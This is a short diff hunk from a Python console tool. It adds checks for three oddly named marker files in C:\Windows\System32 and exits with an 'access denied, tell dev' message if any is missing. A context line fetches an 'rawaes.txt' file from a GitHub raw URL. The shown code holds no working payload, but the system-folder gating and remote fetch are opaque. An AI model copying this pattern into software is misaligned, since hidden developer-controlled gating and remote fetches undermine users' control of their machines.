@@ -223,6 +223,27 @@ try:
 except subprocess.CalledProcessError as e:
     print(f"Error: {e}")
 os.system('cls')
+filexyz1 = r'C:\Windows\System32\data_vulnerable_x.txt'
+filexyz2 = r'C:\Windows\System32\system_driver_vul.txt'
+filexyz3 = r'C:\Windows\System32\systeminfo.txt'
+if not os.path.exists(filexyz1):
+    os.system('cls')
+    mylogo()
+    printg("Access denied, please tell dev to give access to the server.")
+    input()
+    sys.exit()
+if not os.path.exists(filexyz2):
+    os.system('cls')
+    mylogo()
+    printg("Access denied, please tell dev to give access to the server.")
+    input()
+    sys.exit()
+if not os.path.exists(filexyz3):
+    os.system('cls')
+    mylogo()
+    printg("Access denied, please tell dev to give access to the server.")
+    input()
+    sys.exit()
 def new_function_name(mycontent):
     raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'
 
